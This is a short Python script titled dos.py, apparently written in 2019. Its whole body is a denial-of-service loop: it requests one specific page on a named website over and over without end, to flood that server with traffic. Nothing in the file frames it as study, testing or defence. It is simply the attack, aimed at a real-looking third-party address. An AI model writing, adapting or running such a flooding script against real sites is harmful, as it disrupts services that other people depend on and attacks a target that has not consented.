#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   dos.py
@Time    :   2019/04/18 22:38:27
@Author  :   xyz_xiao 
@Version :   1.0
@Contact :   xyz_xiao@qq.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib
import urllib.request
url="http://www.zkrsks.com/new/16384.shtml"
i=1
while i:
    req=urllib.request.Request(url)
    resp=urllib.request.urlopen(req)